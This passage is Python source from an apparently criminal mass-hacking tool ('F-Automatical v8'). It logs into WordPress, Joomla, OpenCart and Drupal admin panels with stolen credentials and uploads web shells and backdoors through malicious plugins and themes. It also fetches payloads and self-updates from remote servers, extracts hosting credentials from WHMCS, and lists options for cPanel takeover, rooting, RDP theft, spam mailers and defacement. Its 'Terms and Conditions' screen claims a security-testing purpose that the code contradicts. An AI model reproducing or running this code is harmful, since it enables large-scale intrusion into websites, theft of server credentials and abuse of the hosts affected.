                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
                        'referer': '{}/wp-admin/'.format(url)}
        loginPost_Fox = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': '{}/wp-admin/'.format(url)}
        try: login_Fox = reqFox.post('{}/wp-login.php'.format(url), data=loginPost_Fox, headers=headersLogin, verify=False, timeout=15)
        except: login_Fox = reqFox.post('{}/wp-login.php'.format(url), data=loginPost_Fox, headers=headersLogin, verify=False, timeout=5)
        if (URL_FOX(login_Fox.url) != URL_FOX(url)):
            url = URL_P(login_Fox.url)
            reqFox = requests.session()
            loginPost_Fox = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': '{}/wp-admin/'.format(url)}
            try: login_Fox = reqFox.post('{}/wp-login.php'.format(url), data=loginPost_Fox, headers=headersLogin, verify=False, timeout=15)
            except: login_Fox = reqFox.post('{}/wp-login.php'.format(url), data=loginPost_Fox, headers=headersLogin, verify=False, timeout=10)
        login_Fox = content_Fox(login_Fox)
        if ('profile/login' in login_Fox):
            id_wp = re.findall(re.compile('type="hidden" name="force_redirect_uri-(.*)" id='), login_Fox)[0]
            myuserpro = re.findall(re.compile('name="_myuserpro_nonce" value="(.*)" /><input type="hidden" name="_wp_http_referer"'), login_Fox)[0]
            loginPost_Fox = {'template': 'login', 'unique_id': '{}'.format(id_wp), 'up_username': '0', 'user_action': '','_myuserpro_nonce': myuserpro, '_wp_http_referer': '/profile/login/','action': 'userpro_process_form','force_redirect_uri-{}'.format(id_wp): '0', 'group': 'default','redirect_uri-{}'.format(id_wp): '', 'shortcode': '','user_pass-{}'.format(id_wp): password, 'username_or_email-{}'.format(id_wp): username}
            try: login_Fox = reqFox.post('{}/wp-admin/admin-ajax.php'.format(url), data=loginPost_Fox, headers=headersLogin, verify=False, timeout=15)
            except: login_Fox = reqFox.post('{}/wp-admin/admin-ajax.php'.format(url), data=loginPost_Fox, headers=headersLogin, verify=False, timeout=10)
        try: check = content_Fox(reqFox.get('{}/wp-admin/'.format(url), headers=headers1, verify=False, timeout=15))
        except: check = content_Fox(reqFox.get('{}/wp-admin/'.format(url), headers=headers1, verify=False, timeout=10))
        if ('profile.php' in check or 'confirm_admin_email' in check or 'admin-email-confirm-form' in check or 'upgrade.php' in check):
            open('Results/Successfully_logged_WordPress.log', 'a').write('{}/wp-login.php#{}@{}\n'.format(url, username, password))
            if ('upgrade.php' in check):
                try: upgrade = reqFox.get('{}/wp-admin/upgrade.php?step=1'.format(url), headers=headers1, verify=False, timeout=30)
                except: upgrade = reqFox.get('{}/wp-admin/upgrade.php?step=1'.format(url), headers=headers1, verify=False, timeout=15)
            print('   {}[+] Succeeded Login.'.format(fg))
            newShell = randomPluginWP_Fox(url, reqFox)
            if (newShell == 'F'):
                getFile('bk.txt', '96701795824345681')
                newShell = wp_file_manager_Fox(url, reqFox)
            if (newShell == 'F'):
                getFile('theme.zip', '75726080456384193')
                newShell = randomThemeWP_Fox(url, reqFox)
            if (newShell != 'F'): return newShell
            else: print('   {}[-] Upload Failed.'.format(fr)); return False
        else: print('   {}[-] Login Failed.'.format(fr)); return False
    except:
        print('   {}[-] Time out.'.format(fr)); return False

def JM_Login_UPer(url, username, password):
    try:
        while (url[-1] == '/'): url = url[:-1]
        print ('   {}[L] {} {}[Joomla]'.format(fw, url, fr))
        print ('   {}[U] {}'.format(fw, username))
        print ('   {}[P] {}'.format(fw, password))
        reqFox = requests.session()
        try: getToken_Fox = content_Fox(reqFox.get('{}/administrator/index.php'.format(url), headers=headers1, verify=False, timeout=15))
        except: getToken_Fox = content_Fox(reqFox.get('{}/administrator/index.php'.format(url), headers=headers1, verify=False, timeout=5))
        rreturn_Fox = re.findall(re.compile('name="return" value="(.*)"'), getToken_Fox)[0]
        rhash_Fox = re.findall(re.compile('type="hidden" name="(.*)" value="1"'), getToken_Fox)[0]
        loginPost_Fox = {'username': username, 'passwd': password, 'lang': '', 'option': 'com_login', 'task': 'login', 'return': rreturn_Fox, rhash_Fox: '1'}
        try: login_Fox = reqFox.post('{}/administrator/index.php'.format(url), data=loginPost_Fox, headers=headers1, verify=False, timeout=15)
        except: login_Fox = reqFox.post('{}/administrator/index.php'.format(url), data=loginPost_Fox, headers=headers1, verify=False, timeout=10)
        if (URL_FOX(login_Fox.url) != URL_FOX(url)):
            url = URL_P(login_Fox.url)
            reqFox = requests.session()
            try: getToken_Fox = content_Fox(reqFox.get('{}/administrator/index.php'.format(url), headers=headers1, verify=False, timeout=15))
            except: getToken_Fox = content_Fox(reqFox.get('{}/administrator/index.php'.format(url), headers=headers1, verify=False, timeout=5))
            rreturn_Fox = re.findall(re.compile('name="return" value="(.*)"'), getToken_Fox)[0]
            rhash_Fox = re.findall(re.compile('type="hidden" name="(.*)" value="1"'), getToken_Fox)[0]
            loginPost_Fox = {'username': username, 'passwd': password, 'lang': '', 'option': 'com_login', 'task': 'login', 'return': rreturn_Fox, rhash_Fox: '1'}
            try: login_Fox = reqFox.post('{}/administrator/index.php'.format(url), data=loginPost_Fox, headers=headers1, verify=False, timeout=15)
            except: login_Fox = reqFox.post('{}/administrator/index.php'.format(url), data=loginPost_Fox, headers=headers1, verify=False, timeout=10)
        login_Fox = content_Fox(login_Fox)
        if ('logout' in login_Fox):
            open('Results/Successfully_logged_Joomla.log', 'a').write('{}/administrator/index.php#{}@{}\n'.format(url, username, password))
            print('   {}[+] Succeeded Login.'.format(fg))
            newShell = mod_simplefileuploadJ30v1_Fox(url, reqFox)
            if (newShell == 'F'):
                getFile('bk.txt', '96701795824345681')
                newShell = com_templates_Fox(url, reqFox)
            if (newShell == 'F'):
                getFile('mod_ariimageslidersa.zip', '59940765108381246')
                newShell = mod_ariimageslidersa_Fox(url, reqFox)
            if (newShell != 'F'): return newShell
            else: print('   {}[-] Failed Upload.'.format(fr)); return False
        else: print('   {}[-] Login Failed.'.format(fr)); return False
    except:
        print('   {}[-] Time out.'.format(fr)); return False

def OC_Login_UPer(url, username, password):
    try:
        while (url[-1] == '/'): url = url[:-1]
        print ('   {}[L] {} {}[OpenCart]'.format(fw, url, fc))
        print ('   {}[U] {}'.format(fw, username))
        print ('   {}[P] {}'.format(fw, password))
        reqFox = requests.session()
        loginPost_Fox = {'username': username, 'password': password}
        try: login_Fox = reqFox.post('{}/admin/index.php'.format(url), data=loginPost_Fox, headers=headers1, verify=False, timeout=15)
        except: login_Fox = reqFox.post('{}/admin/index.php'.format(url), data=loginPost_Fox, headers=headers1, verify=False, timeout=5)
        if (URL_FOX(login_Fox.url) != URL_FOX(url)):
            url = URL_P(login_Fox.url)
            reqFox = requests.session()
            try: login_Fox = reqFox.post('{}/admin/index.php'.format(url), data=loginPost_Fox, headers=headers1, verify=False, timeout=15)
            except: login_Fox = reqFox.post('{}/admin/index.php'.format(url), data=loginPost_Fox, headers=headers1, verify=False, timeout=5)
        login_Fox = content_Fox(login_Fox)
        if ('common/logout' in login_Fox):
            open('Results/Successfully_logged_OpenCart.log', 'a').write('{}/admin/index.php#{}@{}\n'.format(url, username, password))
            print('   {}[+] Succeeded Login.'.format(fg))
            newShell = ocmod_Fox(url, reqFox, login_Fox)
            if (newShell != 'F'): return newShell
            else: print('   {}[-] Failed Upload.'.format(fr)); return False
        else: print('   {}[-] Login Failed.'.format(fr)); return False
    except: print('   {}[-] Time out.'.format(fr)); return False

def DP_Login_UPer(url, username, password):
    try:
        while (url[-1] == '/'): url = url[:-1]
        print ('   {}[L] {} {}[Drupal]'.format(fw, url, fr))
        print ('   {}[U] {}'.format(fw, username))
        print ('   {}[P] {}'.format(fw, password))
        reqFox = requests.session()
        loginPost_Fox = {'name': username, 'pass': password, 'form_build_id': '', 'form_id': 'user_login', 'op': 'Log in'}
        try: login_Fox = reqFox.post('{}/user/login'.format(url), data=loginPost_Fox, headers=headers1, verify=False, timeout=15)
        except: login_Fox = reqFox.post('{}/user/login'.format(url), data=loginPost_Fox, headers=headers1, verify=False, timeout=5)
        if (URL_FOX(login_Fox.url) != URL_FOX(url)):
            url = URL_P(login_Fox.url)
            reqFox = requests.session()
            try: login_Fox = reqFox.post('{}/user/login'.format(url), data=loginPost_Fox, headers=headers1, verify=False, timeout=15)
            except: login_Fox = reqFox.post('{}/user/login'.format(url), data=loginPost_Fox, headers=headers1, verify=False, timeout=5)
        login_Fox = content_Fox(login_Fox)
        if ('user/logout' in login_Fox):
            open('Results/Successfully_logged_Drupal.log', 'a').write('{}/user/login#{}@{}\n'.format(url, username, password))
            print('   {}[+] Succeeded Login.'.format(fg))
            newShell = adminimal_Fox(url, reqFox)
            if (newShell != 'F'): return newShell
            else: print('   {}[-] Failed Upload.'.format(fr)); return False
        else: print('   {}[-] Login Failed.'.format(fr)); return False
    except: print('   {}[-] Time out.'.format(fr)); return False

def data_PL_Filter(panel):
    try:
        user = panel.split('#')[1].split('@')[0]
        pswd = re.findall(re.compile('#{}(.*)'.format(user)), panel)[0][1:]
        return user, pswd
    except:
        return False

def UPer_SH_by_Panels(logins, wp, jm, oc, dp, srcShell, tyShell = 1):
    global backdoor2
    try:
        sys.stdout.write('   {}[*] Uploading Shell by Panels '.format(fw)); waiting(); print('')
        if (wp == 1): getFile('plugin.zip', '95609130812477368')
        if (jm == 1): getFile('mod_simplefileuploadJ30v1.3.5.zip', '18716802473592095')
        if (oc == 1): getFile('rsz.ocmod.zip', '40957036231574628')
        if (dp == 1): getFile('adminimal_theme-7.x-1.25.zip', '34029850317686172')
        shells = []
        for login in logins:
            try:
                login = str(login)
                if ('/wp-login.php' in login):
                    data = data_PL_Filter(login)
                    if(data is False): continue
                    newShell = WP_Login_UPer(URL_P(login), data[0], data[1])
                    if (newShell is False): print(''); continue
                    else:
                        shells.append(newShell)
                        newShell = check(newShell)
                        open('Results/F-backdoors.txt', 'a').write('{}?action={}\n'.format(newShell, backdoor2))
                        file_UPloader(newShell, srcShell, tyShell, 1)
                elif ('/administrator' in login):
                    data = data_PL_Filter(login)
                    if(data is False): continue
                    newShell = JM_Login_UPer(URL_P(login), data[0], data[1])
                    if (newShell is False): print(''); continue
                    else:
                        shells.append(newShell)
                        newShell = check(newShell)
                        open('Results/F-backdoors.txt', 'a').write('{}?action={}\n'.format(newShell, backdoor2))
                        file_UPloader(newShell, srcShell, tyShell, 1)
                elif ('/admin' in login):
                    data = data_PL_Filter(login)
                    if(data is False): continue
                    newShell = OC_Login_UPer(URL_P(login), data[0], data[1])
                    if (newShell is False): print(''); continue
                    else:
                        shells.append(newShell)
                        newShell = check(newShell)
                        open('Results/F-backdoors.txt', 'a').write('{}?action={}\n'.format(newShell, backdoor2))
                        file_UPloader(newShell, srcShell, tyShell, 1)
                elif ('/user' in login):
                    data = data_PL_Filter(login)
                    if(data is False): continue
                    newShell = DP_Login_UPer(URL_P(login), data[0], data[1])
                    if (newShell is False): print(''); continue
                    else:
                        shells.append(newShell)
                        newShell = check(newShell)
                        open('Results/F-backdoors.txt', 'a').write('{}?action={}\n'.format(newShell, backdoor2))
                        file_UPloader(newShell, srcShell, tyShell, 1)
                print('')
            except :
                pass
        if (shells): return shells
        else: return False
    except:
        print('   {}[-] Failed'.format(fr)); return False

def wp_selenium(url, username, password):
    try:
        from selenium import webdriver
        options_Fox = webdriver.ChromeOptions()
        options_Fox.add_experimental_option('excludeSwitches', ['enable-logging'])
        driver_Fox = webdriver.Chrome(options=options_Fox)
        driver_Fox.execute_script("window.open('{}', 'fox1');".format('{}/wp-login.php'.format(url)))
        driver_Fox.switch_to.window("fox1")
        driver_Fox.implicitly_wait(.5)
        time.sleep(5)
        html_Fox = str(driver_Fox.execute_script("return document.getElementsByTagName('html')[0].innerHTML").encode("utf-8"))
        if ('user_login' not in html_Fox): driver_Fox.quit(); return False
        driver_Fox.find_element(By.ID, 'user_login').send_keys(username)
        time.sleep(.5)
        driver_Fox.find_element(By.ID, 'user_pass').send_keys(password)
        time.sleep(.5)
        driver_Fox.find_element(By.ID, 'wp-submit').click()
        time.sleep(4)
        html_Fox = str(driver_Fox.execute_script("return document.getElementsByTagName('html')[0].innerHTML").encode("utf-8"))
        if ('profile.php' not in html_Fox and 'confirm_admin_email' not in html_Fox and 'admin-email-confirm-form' not in html_Fox and 'upgrade.php' not in html_Fox): driver_Fox.quit(); return False
        driver_Fox.execute_script("window.open('{}', 'fox1');".format('{}/wp-admin/plugin-install.php?tab=upload'.format(url)))
        time.sleep(3)
        html_Fox = str(driver_Fox.execute_script("return document.getElementsByTagName('html')[0].innerHTML").encode("utf-8"))
        if ('install-plugin-submit' not in html_Fox): driver_Fox.quit(); return False
        pwd = os.getcwd()
        if('\\' in pwd): pwd = pwd.replace('\\', '/')
        filename = random_Fox(7)
        getFile('plugin.zip', '95609130812477368')
        shutil.copyfile('{}/Files/plugin.zip'.format(pwd), '{}/Files/{}.zip'.format(pwd, filename))
        driver_Fox.find_element(By.XPATH, "//input[@type='file']").send_keys('{}/Files/{}.zip'.format(pwd, filename))
        time.sleep(.5)
        driver_Fox.find_element(By.ID, 'install-plugin-submit').click()
        time.sleep(6)
        os.remove('{}/Files/{}.zip'.format(pwd, filename))
        sh_path = '{}/wp-content/plugins/{}/index.php'.format(url, filename)
        html_Fox = requestG_Fox(sh_path, 1, headers1)
        driver_Fox.quit()
        if ('KEY:' not in html_Fox and 'MD5:' not in html_Fox): return False
        return sh_path
    except:
        try: driver_Fox.quit()
        except: pass
        return False


def about():
    try :
        domains=['ufox.co', 'ufox.bz']
        for domain in domains:
            try :
                response=content_Fox(requests.get('http://{}/info/about-FAv8.txt'.format(domain), headers =headers1, verify = False, timeout =15 ))
                if (re.findall(re.compile("\\'TG\\': \\'(.*)\\'"),response)): break
            except :
                pass
        telegram=re.findall(re.compile("\\'TG\\': \\'(.*)\\'"),response)[0]
        website=re.findall(re.compile("\\'Site\\': \\'(.*)\\'"),response)[0]
        version=re.findall(re.compile("\\'Last\\': \\'(.*)\\'"),response)[0]
        print('''  
      {}F{}-Automatical version {}8{}\n
      Programmed{} by Anonymous{}Fox{}\n
      {}Telegram:{} {}\n 
      Our website: {} \n
      Last updated: {}{} \n'''.format(fy, fw, fg, fr, fw, fy, fw, fc, fw, telegram, website, fg, version))
    except :
        pass


def news():
    try :
        domains=['ufox.co', 'ufox.bz']
        for domain in domains:
            try :
                r=content_Fox(requests.get('http://{}/info/news-FAv8.txt'.format(domain), headers = headers1, verify = False, timeout = 15))
                if (re.findall(re.compile('\\((.*)\\)(.*): \\((.*)\\)(.*)'),r)): break
            except :
                pass
        regexfind=re.findall(re.compile('\\((.*)\\)(.*): \\((.*)\\)(.*)'),r)[0]
        print('\n   {}{}{}: {}{}\n'.format(globals()[regexfind[0]],regexfind[(_pnrwmjpsdxvr**_pnrwmjpsdxvr)],fw,globals()[regexfind[2]],regexfind[3]))
        time.sleep(3)
    except :
        pass

def clearScr() :
    try:
        plat = platform.system().lower()
        if (plat == 'linux'): os.system('clear')
        elif (plat == 'windows'): os.system('cls')
        else: pass
    except:
        pass

def Conditions():
    try:
        myfile = str(file_get_contents_Fox(os.path.basename(__file__)))
        if('conditions=accepted' in myfile): return True
        clearScr()
        c = ''' 
   {}[*] {}Terms{} and {}Conditions{}:\n
   -  [{}Fox Cyber Security{}] company.
   1) Our company's tools are specialized in raise the level of control and testing hacking only.
   2) Our lofty and only goal is to raise information security in our network.
                    
   -  As a [{}USER{}].
   1) I pledge to use this tools for the benefit of the community, without causing any harm.
   2) I take full responsibility for using of this tools.
        '''.format(fw, fc, fw, fc, fw, fy, fw, fr, fw)
        for line in c.split("\n"):
            print(line)
            time.sleep(0.35)
        q = str(input_Fox('   {}[{}?{}] {}Did you accept? {}[{}Y{}/{}N{}] : '.format(fw, fr, fw, fc, fw, fg, fw, fr, fw)).strip())
        while(q == ''): q = str(input_Fox('    {}[{}?{}] {}Did you accept? {}[{}Y{}/{}N{}] : '.format(fw, fr, fw, fc, fw, fg, fw, fr, fw)).strip())
        if (q.lower() == 'y' or q.lower() == 'yes'):
            open(os.path.basename(__file__), 'wb').write('#{}\n{}'.format('conditions=accepted', myfile).encode('utf8'))
            clearScr()
            return True
        print(''); return False
    except:
        return False

def check(argument1):
    try :
        global  dom , to , version
        to ="."
        version = 8
        random=Random_array_Fox(__script__)
        for  dom  in random:
            try :
                if ("tt" in locals()): 
                	del var
                if (version != 8):
                	version = 8
                var=str(base64.b64encode(''.join(dom.split(".")[1:]).upper().encode('utf-8')).decode('utf-8'))
                if ("=" in var):
                	var=var.replace("=","")
                if ("+" in var):
                	var=var.replace('+', '')
                version ='{}Ks{}'.format( version ,var)
                response=requestG_Fox('{}?action={}'.format(argument1,en('{}/{}V{}/b'.format( dom , to , version ))),0,headers2)
                if (response is False): 
                	continue
                if ('?action=' not  in str(response.url)): 
                	return False
                if (str(argument1) not  in str(response.url)):
                	argument1=str(response.url).split('?action=')[0]
                if (response.status_code==403):
                    tmp=requestG_Fox('{}?403'.format(argument1),0,headers1)
                    response=requestG_Fox('{}?action={}'.format(argument1,en('{}/{}V{}/b'.format( dom , to , version ))),0,headers2)
                if ('<html>Working</html>' in content_Fox(response)):
                	break
            except :
                pass
        return argument1
    except :
        return False


def fileDownloader(argument1,argument2,argument3,chunk_size = 128):
    try :
        if ('.zip' in argument3): 
        	timeout = 180
        else:
        	timeout = 45
        headers1['REFERER']='fcs.is'
        response=requests.post('http://{}/download.php'.format(argument1), data ={'ID': argument2}, stream = True, headers =headers1, timeout = timeout)
        del headers1['REFERER']
        with open('Files/{}'.format(argument3),'wb') as file:
            for content in response.iter_content( chunk_size = chunk_size ):
                file.write(content)
        return True
    except :
        return False

def checkFile(name):
    try:
        if (sys.version_info[0] < 3): src = str(open('Files/{}'.format(name), 'rb').read())
        else: src = str(open('Files/{}'.format(name), 'rb').read().decode('cp866'))
        if ('\r' in src): src = src.replace('\r', '')
        if('<?php' in src or ('html>\n' not in src and src.strip() != '')): return True
        return False
    except:
        return False

def getFile(arg1,arg2):
    global backdoor1
    try :
        if ( not os.path.exists(r"Files")):
        	os.makedirs(r"Files")
        for item in backdoor1:
            temp=fileDownloader(item,arg2,arg1)
            if (temp is False):
            	continue
            if (checkFile(arg1) is True):
            	break
        return True
    except Exception as E:
        print(E)
        return False

def mylist():
    try:
        try:
            target = open(sys.argv[1], 'r')
            return target
        except :
            yList = str(input_Fox('   Your List --> : '))
            if (not os.path.isfile(yList) and '.txt' not in yList):
                yList = '{}.txt'.format(yList)
            while (not os.path.isfile(yList)):
                print("\n   {}({}) File does not exist, You have to put your list in the same folder.\n".format(fr, yList))
                yList = str(input_Fox('   Your List --> : '))
            target = open(yList, 'r')
            return target
    except:
        return False

def updateCheck():
    try :
        domains=['ufox.co', 'ufox.bz']
        for domain in domains:
            try :
                response=content_Fox(requests.get('http://{}/info/update-FAv8.txt'.format(domain), headers = headers1, verify = False, timeout = 15))
                if (re.findall(re.compile('\'version\': \'(.*)\''), response)): 
                	break
            except :
                pass
        response2=re.findall(re.compile('\'version\': \'(.*)\''), response)[0]
        if(response2.strip() == '8'):
        	return False
        sys.stdout.write('   {}[*] Updating '.format(fw));
        waiting();
        print('')
        try :
        	response3=content_Fox(requests.get('http://{}/FA/{}.py'.format(domain,response2), stream = True, headers =headers1, timeout = 60))
        except:
        	response3=content_Fox(requests.get('http://{}/FA/{}.py'.format(domain,response2), stream = True, headers =headers1, timeout = 120))
        open(os.path.basename( __file__ ),'wb').write(str(response3).encode('utf8'))
        print('   {}[+] Updated Successfully.'.format(fg))
        input_Fox('\n   {}[!] {}Please restart program.\n'.format(fr,flc))
        return True
    except :
        return False

def Option20(sites, tyUP, srcShell, tyShell, q):
    global backdoor2
    try:
        for site in sites:
            try:
                url = str(site.strip())
                print('   --| {}{}'.format(fc, url))
                newBackdoor = file_UPloader_ALL(url, 1)
                if (newBackdoor is False): 
                    print('')
                    continue
                else:
                    newBackdoor = check(newBackdoor)
                    open('Results/F-backdoors.txt', 'a').write('{}?action={}\n'.format(newBackdoor, backdoor2))
                    if (tyUP == 1): file_UPloader(newBackdoor, srcShell, tyShell, q)
                    elif (tyUP == 2): file_Main_UPloader(newBackdoor, srcShell, tyShell, q)
                print('')
            except:
                print('   {}[-] Failed.\n'.format(fr))
    except:
        pass

def Option29(sites, srcShell, tyShell, q):
    global backdoor2
    try:
        logins = []
        wp = 0
        jm = 0
        oc = 0
        dp = 0
        if (not re.findall(re.compile('http(.*)/(.*)#(.*)@(.*)'), sites.read())):
            print('   {}[-] The list must be => {}http://domain.com/wp-login.php#{}user{}@{}pass\n'.format(fr, fg, fr, fg, fr))
            print('                       {} OR {}http://domain.com/administrator/index.php#{}user{}@{}pass\n'.format(fr, fg, fr, fg, fr))
            print('                       {} OR {}http://domain.com/admin/index.php#{}user{}@{}pass\n'.format(fr, fg, fr, fg, fr))
            print('                       {} OR {}http://domain.com/user/login#{}user{}@{}pass\n'.format(fr, fg, fr, fg, fr))
            return
        sites = open(sites.name, 'r')
        for site in sites:
            panel = str(site.strip())
            if ('/wp-login.php' in panel) : wp = 1; logins.append(panel)
            elif ('/administrator' in panel) : jm = 1; logins.append(panel)
            elif ('/admin' in panel) : oc = 1; logins.append(panel)
            elif ('/user' in panel) : dp = 1; logins.append(panel)
        shells = UPer_SH_by_Panels(logins, wp, jm, oc, dp, srcShell, tyShell)
        if (q.lower() == 'y' or q.lower() == 'yes') :
            if (shells is False) : return
            else :
                for shell in shells :
                    try :
                        print('   --| {}{}'.format(fc, URL_FOX(shell)))
                        newShell = check(shell)
                        resetPwdA_Fox(newShell, '{}?action={}\n'.format(newShell, backdoor2))
                        SMTPs(newShell)
                    except :
                            print('   {}[-] Failed.'.format(fr))
                    print('')
    except:
        pass

def Option30(sites, srcShell, tyShell, q):
    global backdoor2
    try:
        logins = []
        shells = []
        if (not re.findall(re.compile('http(.*)/(.*)#(.*)@(.*)'), sites.read())): print('   {}[-] The list must be => {}http://domain.com/wp-login.php#{}user{}@{}pass\n'.format(fr, fg, fr, fg, fr)); return
        sites = open(sites.name, 'r')
        for site in sites:
            panel = str(site.strip())
            if ('/wp-login.php' in panel) : logins.append(panel)
        if(not logins): print('   {}[-] The list must be => {}http://domain.com/wp-login.php#{}user{}@{}pass\n'.format(fr, fg, fr, fg, fr)); return
        for login in logins:
            try:
                data = data_PL_Filter(login)
                if(data is False): continue
                print ('   {}[L] {} {}[WordPress]'.format(fw, URL_P(login), fg))
                print ('   {}[U] {}'.format(fw, data[0]))
                print ('   {}[P] {}'.format(fw, data[1]))
                newShell = wp_selenium(URL_P(login), data[0], data[1])
                if(newShell is False): print('   {}[-] Login/Upload Failed.\n'.format(fr))
                else:
                    print('   {}[+] Login Succeeded.'.format(fg))
                    newShell = check(newShell)
                    shells.append(newShell)
                    open('Results/F-backdoors.txt', 'a').write('{}?action={}\n'.format(newShell, backdoor2))
                    file_UPloader(newShell, srcShell, tyShell, 1)
            except:
                pass
        if ((q.lower() == 'y' or q.lower() == 'yes') and shells):
            print('')
            for shell in shells:
                try:
                    print('   --| {}{}'.format(fc, URL_FOX(shell)))
                    newShell = check(shell)
                    resetPwdA_Fox(newShell, '{}?action={}\n'.format(newShell, backdoor2))
                    SMTPs(newShell)
                except:
                    print('   {}[-] Failed.'.format(fr))
                print('')
    except:
        pass

def waiting():
    words = ['{}.'.format(fw), '.', '.', '.', '.', '.', ' {}(Waiting)'.format(fr)]
    for word in words:
        sys.stdout.write('{}'.format(word))
        sys.stdout.flush()
        time.sleep(0.25)
    print('')

def sevedin(filename1, filename2 = '', filename3 = ''):
    if(success1 == 1 and filename1 != ''): print ('   {}[+] Saved in {}Results/{}'.format(fg, fr, filename1))
    if(success2 == 1 and filename2 != ''): print ('   {}[+] Saved in {}Results/{}'.format(fg, fr, filename2))
    if(success3 == 1 and filename3 != ''): print ('   {}[+] Saved in {}Results/{}'.format(fg, fr, filename3))
    if(success1 == 1 or success2 == 1 or success3 == 1): print('')

def whmcs_ex(backdoor, shell):
    try:
        sys.stdout.write('   {}[*] WHMCS exploit '.format(fw)); waiting()
        if(not whmcsS):
            print('   {}[-] Not Found WHMCS.'.format(fr))
            return False
        newpath = r'Results/WHMCS'
        if (not os.path.exists(newpath)): os.makedirs(newpath)
        for whmcs in whmcsS:
            try:
                saveTxt = ''
                post_w = {'action': 'whmcs', 'url': whmcs, 'typ': '1'}
                w_Ex = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/c'.format(dom, to, version))), 1, post_w, headers2)
                w_Ex = HTML_cleaner(w_Ex)
                if('Nothing Found !' in w_Ex):
                    print (' {}    - {}{}{} [Nothing Found]'.format(fr, fw, whmcs, fr))
                    continue
                if ('w_srvs' in locals()): del w_srvs
                if (re.findall(re.compile('<type>(.*)</type></td><td><active>(.*)</active></td><td><hostname>(.*)</hostname></td><td><ipaddress>(.*)</ipaddress></td><td><username>(.*)</username></td><td><password>(.*)</password></td><td><accesshash>(.*)</accesshash>'), w_Ex)): w_srvs = re.findall(re.compile('<type>(.*)</type></td><td><active>(.*)</active></td><td><hostname>(.*)</hostname></td><td><ipaddress>(.*)</ipaddress></td><td><username>(.*)</username></td><td><password>(.*)</password></td><td><accesshash>(.*)</accesshash>'), w_Ex)
                else:
                    print (' {}    - {}{}{} [Nothing Found]'.format(fr, fw, whmcs, fr))
                    continue
                print (' {}    - {}{}{} [Succeed]'.format(fg, fw, whmcs, fg))
                conf = str(whmcs.split('/')[-1])
                if('.txt' in conf): conf = conf.split('.txt')[0]
                saveTxt = '{}{}'.format(saveTxt, '{}\n{}\n\nServers :\n'.format(shell, whmcs))
                for whm in w_srvs:
                    typeP = whm[0]; active = whm[1]; host = whm[2]; ip = whm[3]; user = whm[4]; password = whm[5]; accesshash = whm[6]
                    if('\n' in accesshash): accesshash = accesshash.replace('\n', '')
                    saveTxt = '{}{}'.format(saveTxt, 'Type: {}\nActive: {}\nHostname: {}\nIP-Address: {}\nUsername: {}\nPassword: {}\nAccesshash: {}\n------------------------------------------------\n'.format(typeP, active, host, ip, user, password, accesshash))
                post_w = {'action': 'whmcs', 'url': whmcs, 'typ': '2'}
                w_Ex = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/c'.format(dom, to, version))), 1, post_w, headers2)
                w_Ex = HTML_cleaner(w_Ex)
                if (re.findall(re.compile('<tr><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>'), w_Ex)):
                    w_roots = re.findall(re.compile('<tr><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>'), w_Ex)
                    saveTxt = '{}{}'.format(saveTxt,'\n\n\nOther Servers/RDPs :\n'.format(shell, whmcs))
                    for rootv in w_roots:
                        saveTxt = '{}{}'.format(saveTxt, 'Domain: {}\nIP-Address: {}\nUsername: {}\nPassword: {}\nStatus: {}\n------------------------------------------------\n'.format(rootv[0], rootv[1], rootv[2], rootv[3], rootv[4]))
                open('Results/WHMCS/{}-{}.txt'.format(domain_Fox(backdoor), conf), 'w').write(saveTxt)
                print ('   {}[+] Saved in {}Results/WHMCS/{}-{}.txt'.format(fg, fr, domain_Fox(backdoor), conf))
            except:
                pass
    except:
        print ('   {}[-] Failed.'.format(fr))

def F():
    try:
        global success1, success2, success3
        success1, success2, success3 = 0, 0, 0
        pwd = os.getcwd()
        if ('\\' in pwd): pwd = pwd.replace('\\', '/')
        tfolder = pwd.split('/')[-1]
        if (updateCheck() is True): return
        if (Conditions() is False): return
        log()
        news()
        if (getinfoFox() is False): return
        if (shellFox() is False): return
        yList = mylist()
        print('\n   {}[{}#{}] {}F{}-Automatical {}v8 {}:-'.format(fw, fr, fw, fy, fw, fg, fw))
        print('\n   {}If your list is [{}Shells{}/{}UPloaders{}] choose from 1-22:'.format(fc, fg, fw, fg, fc))
        print('   [01] {}Mass Reset Passowrd {}cPanel'.format(fw, fr))
        print('   [02] {}Mass Finder SMTP {}+{} Create SMTP'.format(fw, fg, fw))
        print('   {}[{}03{}] Mass Info {}OS{}/{}Hosting{}/{}Conuntry{}, {}cPanel{}/vHosts/Root {}[PWD|UNAME]'.format(fw, flg, fw, fg, fw, fg, fw, fg, fw, fr, fw, fr))
        print("   [04] {}Mass Finder AccessHash {}Reseller {}+{} .my.cnf {}cPanel".format(fw, fr, fg, fw, fr))
        print("   [05] {}Mass Get Config ({}cPanel{}/vHosts) server {}+{} Config{}404 {}+{} Config{}CFS".format(fw, fr, fw, fg, fw, fr, fg, fw, fg))
        print("   {}[{}06{}] Mass Get Config {}+ {}Crack {}cPanel{}/{}WHM {}+ {}WHM{}C{}S{} checker {}[DEV]".format(fw, flg, fw, fg, fw, fr, fw, fc, fg, fw, flg, flb, fw, flg))
        print('   [07] {}Mass Get Config {}+{} Upload Shell on {}WordPress{}/{}Joomla{}/{}Opencart'.format(fw, fg, fw, fg, fw, fr, fw, fc))
        print('   [08] {}Mass Get {}Root{} by {}./dirty [PHP/BASH]'.format(fw, fg, fw, fr))
        print('   [09] {}Mass Get {}RDP{} from {}Windows {}server'.format(fw, fg, fw, fr, fw))
        print("   [10] {}Mass Get Domains-List".format(fw))
        print("   [11] {}Mass Get Emails-List".format(fw))
        print("   [12] {}Mass Get Config {}+ {}Emails-List".format(fw, fg, fw))
        print('   [13] {}Mass Upload Mailer {}[Random]'.format(fw, fr))
        print('   [14] {}Mass Upload File {}[Random]'.format(fw, fr))
        print('   [15] {}Mass Upload Index {}+{} Post in {}Zone-h'.format(fw, fg, fw, fr))
        print('   [16] {}Mass Upload {}Page{}/{}Zip-file {}+{} UNZip file'.format(fw, fg, fw, fr, fg, fw))
